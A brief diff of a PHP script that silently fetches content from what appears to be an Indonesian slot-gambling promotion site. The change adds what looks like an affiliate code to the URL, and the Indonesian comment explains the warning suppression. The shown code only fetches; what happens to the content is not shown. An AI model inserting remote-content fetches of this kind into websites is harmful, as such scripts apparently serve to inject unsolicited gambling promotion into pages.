@@ -1,5 +1,5 @@
 <?php
-$url = 'https://newlivertp.sobat138.today/';
+$url = 'https://newlivertp.sobat138.today/?a=W1520LNJ1393';
 
 $content = @file_get_contents($url); // Menggunakan @ untuk mengabaikan warning jika gagal
 
